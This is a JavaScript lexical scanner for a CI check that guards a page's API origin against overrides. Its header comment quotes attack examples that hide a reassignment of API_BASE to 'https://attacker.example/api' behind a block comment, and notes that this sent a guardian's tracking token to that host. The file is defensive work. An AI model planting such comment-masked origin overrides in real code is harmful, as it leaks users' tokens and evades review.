'use strict';

/**
 * A minimal JavaScript lexical scanner — enough to tell code from comments,
 * strings, template literals and regex literals, and nothing more.
 *
 * Why this exists
 * ---------------
 * The first two versions of check-api-origin.js decided what was a comment by
 * looking at whether a *line* started with `//`, `*` or `/*`, and then blanked
 * the entire line. Review broke it with two characters:
 *
 *     \/* staging escape hatch *\/ API_BASE = 'https://attacker.example/api';
 *
 * The line starts with a block comment, so the whole line vanished from the text
 * the rules inspected — including the live reassignment after the comment
 * closed. The checker printed a green tick while a DOM-stubbed run of the real
 * file fetched a guardian's tracking token to `attacker.example`. The same trick
 * hid `\/* v2 *\/ var API_BASE = '<attacker>';` placed after the good line: a
 * legal duplicate `var`, clean under `node --check`, last write wins, and the
 * value the guard validated was not the value the page used.
 *
 * Line-granular stripping cannot be patched into correctness. This scans
 * character by character instead.
 *
 * What it returns
 * ---------------
 *   { code, bare }
 *
 * Both are the same LENGTH and have the same LINE STRUCTURE as the input, so
 * regex match indices still map to real line numbers.
 *
 *   code — comment spans replaced by spaces; string and regex contents KEPT.
 *          Use it to read the declared origin, and to spot an override that
 *          reads a URL parameter (`get('api')`), since the parameter name only
 *          exists inside a string.
 *
 *   bare — comment spans AND the contents of strings, template literals and
 *          regex literals all replaced by spaces; delimiters kept. Use it to
 *          COUNT assignments, so that `var help = 'API_BASE = x';`,
 *          `` `API_BASE=${x}` ``, `/API_BASE=/` and a trailing
 *          `// was API_BASE = ...` stop being counted as assignments. Each of
 *          those turned the build red on ordinary code under the previous
 *          version.
 *
 * Deliberate limits
 * -----------------
 *  - `${...}` inside a template literal is treated as part of the literal, not
 *    as re-entered code. An assignment hidden in an interpolation would be
 *    missed; that is accepted, because the check is defence against accidental
 *    drift and a re-added override, not against an author deliberately
 *    smuggling code past their own CI.
 *  - Regex-versus-division is resolved with the standard previous-significant-
 *    character heuristic. It is not a parser. If it ever guesses wrong the
 *    consequence is a mangled `bare` view, which fails closed (a spurious
 *    error), never a silent pass.
 */

/** Characters after which a `/` begins a regex literal rather than division. */
const REGEX_PRECEDERS = new Set([
  '(', ',', '=', ':', '[', '!', '&', '|', '?', '{', '}', ';', '+', '-', '*',
  '%', '~', '^', '<', '>', '\n',
]);

/** Keywords after which a `/` begins a regex literal. */
const REGEX_KEYWORDS = [
  'return', 'typeof', 'instanceof', 'in', 'of', 'new', 'delete', 'void',
  'case', 'do', 'else', 'yield', 'await', 'throw',
];

function precedingKeyword(out, index) {
  // Walk back over the emitted code to grab the trailing word, if any.
  let end = index;
  while (end > 0 && /\s/.test(out[end - 1])) end -= 1;
  let start = end;
  while (start > 0 && /[A-Za-z$_]/.test(out[start - 1])) start -= 1;
  return out.slice(start, end).join('');
}

/**
 * @param {string} src
 * @returns {{ code: string, bare: string }}
 */
function scanSource(src) {
  const code = [];
  const bare = [];

  /** Emit one character into both views. */
  const emit = (ch, mode) => {
    if (ch === '\n') {
      code.push('\n');
      bare.push('\n');
      return;
    }
    if (mode === 'comment') {
      code.push(' ');
      bare.push(' ');
      return;
    }
    if (mode === 'inner') {
      // Inside a string / template / regex body: visible to `code`, hidden from `bare`.
      code.push(ch);
      bare.push(' ');
      return;
    }
    code.push(ch);
    bare.push(ch);
  };

  let i = 0;
  const n = src.length;

  while (i < n) {
    const ch = src[i];
    const next = src[i + 1];

    // ── line comment ──────────────────────────────────────────────────────
    if (ch === '/' && next === '/') {
      while (i < n && src[i] !== '\n') {
        emit(src[i], 'comment');
        i += 1;
      }
      continue;
    }

    // ── block comment ─────────────────────────────────────────────────────
    if (ch === '/' && next === '*') {
      emit(src[i], 'comment');
      emit(src[i + 1], 'comment');
      i += 2;
      while (i < n && !(src[i] === '*' && src[i + 1] === '/')) {
        emit(src[i], 'comment');
        i += 1;
      }
      if (i < n) {
        emit(src[i], 'comment');
        emit(src[i + 1], 'comment');
        i += 2;
      }
      continue;
    }

    // ── single / double quoted string ──────────────────────────────────────
    if (ch === "'" || ch === '"') {
      const quote = ch;
      emit(ch, 'code');
      i += 1;
      while (i < n) {
        if (src[i] === '\\') {
          emit(src[i], 'inner');
          if (i + 1 < n) emit(src[i + 1], 'inner');
          i += 2;
          continue;
        }
        if (src[i] === quote) break;
        if (src[i] === '\n') break; // unterminated; let the next pass see it
        emit(src[i], 'inner');
        i += 1;
      }
      if (i < n && src[i] === quote) {
        emit(src[i], 'code');
        i += 1;
      }
      continue;
    }

    // ── template literal ──────────────────────────────────────────────────
    if (ch === '`') {
      emit(ch, 'code');
      i += 1;
      while (i < n) {
        if (src[i] === '\\') {
          emit(src[i], 'inner');
          if (i + 1 < n) emit(src[i + 1], 'inner');
          i += 2;
          continue;
        }
        if (src[i] === '`') break;
        emit(src[i], 'inner'); // includes newlines via emit's own handling
        i += 1;
      }
      if (i < n && src[i] === '`') {
        emit(src[i], 'code');
        i += 1;
      }
      continue;
    }

    // ── regex literal, or division ────────────────────────────────────────
    if (ch === '/') {
      let prev = code.length - 1;
      while (prev >= 0 && /\s/.test(code[prev])) prev -= 1;
      const prevCh = prev >= 0 ? code[prev] : '\n';
      const kw = precedingKeyword(code, code.length);
      const isRegex = REGEX_PRECEDERS.has(prevCh) || REGEX_KEYWORDS.includes(kw);

      if (!isRegex) {
        emit(ch, 'code'); // division
        i += 1;
        continue;
      }

      emit(ch, 'code');
      i += 1;
      let inClass = false;
      while (i < n) {
        if (src[i] === '\\') {
          emit(src[i], 'inner');
          if (i + 1 < n) emit(src[i + 1], 'inner');
          i += 2;
          continue;
        }
        if (src[i] === '[') inClass = true;
        else if (src[i] === ']') inClass = false;
        else if (src[i] === '/' && !inClass) break;
        else if (src[i] === '\n') break; // unterminated
        emit(src[i], 'inner');
        i += 1;
      }
      if (i < n && src[i] === '/') {
        emit(src[i], 'code');
        i += 1;
        while (i < n && /[a-z]/.test(src[i])) {
          emit(src[i], 'code'); // flags
          i += 1;
        }
      }
      continue;
    }

    emit(ch, 'code');
    i += 1;
  }

  return { code: code.join(''), bare: bare.join('') };
}

module.exports = { scanSource };
